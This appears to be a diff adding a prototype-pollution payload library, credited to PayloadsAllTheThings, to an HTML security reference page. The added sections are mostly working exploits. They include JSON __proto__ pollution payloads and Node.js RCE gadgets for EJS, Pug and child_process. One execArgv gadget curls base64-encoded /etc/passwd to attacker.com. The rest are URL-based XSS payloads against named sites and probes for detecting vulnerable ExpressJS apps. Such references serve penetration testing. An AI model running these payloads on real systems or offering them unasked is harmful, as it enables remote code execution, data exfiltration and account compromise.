@@ -120,6 +120,103 @@ if (req.user.permissions.includes('admin')) &#123; &#125;
 if (!user.banned) &#123; /* allow */ &#125;
 # Object.prototype.banned = false (already is, but can override to undefined/false)</code></pre>
 
+  <h2>Prototype Pollution Payload Library</h2>
+  <p>Payload reference from PayloadsAllTheThings covering all injection vectors.</p>
+
+  <h3>JSON Input Payloads</h3>
+  <pre><code>// Basic pollution via __proto__:
+{"__proto__": {"evilProperty": "evilPayload"}}
+
+// Pollution via constructor.prototype:
+{"constructor": {"prototype": {"foo": "bar", "json spaces": 10}}}
+
+// Node.js async RCE gadget (DNS callback):
+{
+  "__proto__": {
+    "argv0": "node",
+    "shell": "node",
+    "NODE_OPTIONS": "--inspect=payload\"\".oastify\"\".com"
+  }
+}
+
+// EJS template engine RCE gadget:
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
+
+// Express.js json spaces detection probe:
+{"__proto__": {"json spaces": " "}}
+// → If response JSON has extra spaces: vulnerable</code></pre>
+
+  <h3>URL Query String Payloads (In-the-Wild)</h3>
+  <pre><code">https://victim.com/#a=b&amp;__proto__[admin]=1
+https://example.com/#__proto__[xxx]=alert(1)
+https://www.apple.com/shop/buy-watch?__proto__[src]=image&amp;__proto__[onerror]=alert(1)
+https://www.apple.com/shop/buy-watch?a[constructor][prototype]=image&amp;a[constructor][prototype][onerror]=alert(1)
+http://server/servicedesk?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E</code></pre>
+
+  <h3>ExpressJS Manual Testing Probes</h3>
+  <pre><code>// Test for prototype pollution in ExpressJS apps:
+
+// parameterLimit probe — reduce allowed params, send extra:
+{"__proto__": {"parameterLimit": 1}}
+// Send 2+ GET parameters — if only 1 reflected: vulnerable
+
+// ignoreQueryPrefix probe:
+{"__proto__": {"ignoreQueryPrefix": true}}
+// Send: ??foo=bar — if foo is parsed: vulnerable
+
+// allowDots probe:
+{"__proto__": {"allowDots": true}}
+// Send: ?foo.bar=baz — if foo.bar parsed: vulnerable
+
+// CORS header probe:
+{"__proto__": {"exposedHeaders": ["X-PP-Test"]}}
+// If Access-Control-Expose-Headers: X-PP-Test appears: vulnerable
+
+// Status code probe:
+{"__proto__": {"status": 510}}
+// If HTTP 510 is returned: vulnerable</code></pre>
+
+  <h2>Server-Side Prototype Pollution</h2>
+  <p>Node.js server-side gadgets and exploitation techniques from PayloadsAllTheThings.</p>
+
+  <h3>Known Vulnerable Libraries</h3>
+  <pre><code># Lodash &lt;4.17.21 (CVE-2019-10744):
+const _ = require('lodash');
+_.merge({}, JSON.parse(userInput));  // pollutes Object.prototype
+
+# Lodash &lt;4.17.17 — mergeWith, defaultsDeep:
+_.mergeWith({}, JSON.parse(userInput));
+_.defaultsDeep({}, JSON.parse(userInput));
+
+# jQuery.extend() with deep=true:
+$.extend(true, {}, JSON.parse(userInput));
+
+# flat package (npm) — deserialize() before fix:
+const {unflatten} = require('flat');
+unflatten({"__proto__.polluted": "yes"});
+
+# qs package — parsing nested params:
+qs.parse("__proto__[polluted]=yes", {allowPrototypes: true});  // vulnerable config</code></pre>
+
+  <h3>RCE Gadgets (Node.js)</h3>
+  <pre><code># child_process.spawn — shell option gadget:
+{"__proto__": {"shell": "/bin/bash", "env": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}}
+
+# execArgv gadget:
+{"__proto__": {"execArgv": ["--eval", "require('child_process').exec('id|curl http://attacker.com/rce?d=$(cat /etc/passwd|base64)')"]}}
+
+# EJS render gadget (outputFunctionName):
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
+
+# Pug template engine gadget:
+{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
+
+# Tools:
+# pp-finder — automated gadget discovery: github.com/yeswehack/pp-finder
+# silent-spring — automated PP→RCE analysis: github.com/yuske/silent-spring
+# server-side-prototype-pollution gadgets: github.com/yuske/server-side-prototype-pollution
+# Burp Extension: "Server-Side Prototype Pollution Scanner"</code></pre>
+
   <h2>Tools &amp; Resources</h2>
   <ul>
     <li>Burp Suite — Hackvertor extension for encoding payloads</li>
